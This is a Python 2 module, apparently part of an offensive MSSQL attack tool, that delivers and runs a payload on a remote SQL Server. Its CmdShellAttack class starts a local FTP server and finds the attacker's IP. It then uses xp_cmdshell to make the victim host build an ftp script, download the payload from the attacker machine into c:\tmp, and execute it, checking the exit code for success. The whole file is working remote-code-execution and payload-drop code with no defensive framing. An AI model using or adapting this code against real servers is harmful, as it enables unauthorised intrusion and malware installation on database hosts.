"""This module handles the payload sending to remote host and executing on remote host."""

import os
import multiprocessing
import logging
import socket

import pymssql

import consts
import ftp_server


class AttackHost:
    """
        This class acts as an interface for the attacking methods class

        Args:
            payload_path (str): The local path of the payload file
    """

    def __init__(self, payload_path):
        self.payload_path = payload_path

    def send_payload(self):
        raise NotImplementedError("Send function not implemented")

    def execute_payload(self):
        raise NotImplementedError("execute function not implemented")


class CmdShellAttack(AttackHost):

    """
    This class uses the xp_cmdshell command execution and will work only if its available on the remote host.

        Args:
            payload_path (str): The local path of the payload file
            cursor (pymssql.conn.obj): A cursor object from pymssql.connect to run commands with.

    """

    def __init__(self, payload_path, cursor):
        super(CmdShellAttack, self).__init__(payload_path)
        self.ftp_server, self.ftp_server_p = self.__init_ftp_server()
        self.cursor = cursor
        self.attacker_ip = self.__find_own_ip()

    def send_payload(self):
        """
            Sets up an FTP server and using it to download the payload to the remote host

            Return:
                True if payload sent False if not.
        """

        # Sets up the cmds to run
        shellcmd1 = """xp_cmdshell "mkdir c:\\tmp& chdir c:\\tmp& echo open {0} {1}>ftp.txt&
        echo {2} >> ftp.txt" """.format(self.attacker_ip, consts.FTP_SERVER_PORT, consts.FTP_SERVER_USER)
        shellcmd2 = """xp_cmdshell "chdir c:\\tmp& echo {0} >> ftp.txt" """.format(consts.FTP_SERVER_PASSWORD)

        shellcmd3 = """xp_cmdshell "chdir c:\\tmp& echo get {0} >> ftp.txt& echo bye >> ftp.txt&
         ftp - s:ftp.txt" """.format(self.payload_path)

        shellcmds = [shellcmd1, shellcmd2, shellcmd3]

        # Checking to see if ftp server is up
        if self.ftp_server_p and self.ftp_server:

            try:
                # Running the cmd on remote host
                for cmd in shellcmds:
                    self.cursor.execute(cmd)
            except Exception, e:
                logging.error('Error sending the payload using xp_cmdshell to host: {0}'.format(e.message))
                return False
            return True
        else:
            logging.error("Couldn't establish an FTP server for the dropout")
            return False

    def execute_payload(self):

        """
            Executes the payload after ftp drop

            Return:
                True if payload was executed successfully, False if not.
        """

        # Getting the payload's file name
        payload_file_name = os.path.split(self.payload_path)[1]

        # Preparing the cmd to run on remote, using no_output so i can capture exit code: 0 -> success, 1 -> error.
        shellcmd = """DECLARE @i INT
                      EXEC @i=xp_cmdshell "C:\\tmp\\{0}", no_output
                      SELECT @i """.format(payload_file_name)

        try:
            # Executing payload on remote host
            logging.debug('Starting execution process of payload: {0} on remote host'.format(payload_file_name))
            self.cursor.execute(shellcmd)
            if self.cursor.fetchone()[0] == 0:
                # Success
                self.ftp_server_p.terminate()
                logging.debug('Payload: {0} execution on remote host was a success'.format(payload_file_name))
                return True
            else:
                logging.warning('Payload: {0} execution on remote host failed'.format(payload_file_name))
                self.ftp_server_p.terminate()
                return False

        except pymssql.OperationalError:
            logging.error('Executing payload: {0} failed'.format(payload_file_name))
            self.ftp_server_p.terminate()
            return False

    def __init_ftp_server(self):
        """
            Init an FTP server using FTP class on a different process

            Return:
                ftp_s: FTP server object
                p: the process obj of the FTP object
        """

        try:
            ftp_s = ftp_server.FTP()
            multiprocessing.log_to_stderr(logging.DEBUG)
            p = multiprocessing.Process(target=ftp_s.run_server)
            p.start()
            logging.debug('Successfully established an FTP server in another process: {0}, {1}'.format(ftp_s, p.name))
            return ftp_s, p
        except Exception, e:
            logging.error('Exception raised while trying to pull up the ftp server: {0}'.format(e.message))
            return None, None

    def __find_own_ip(self):
        ip_list = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")]
        return ip_list[0]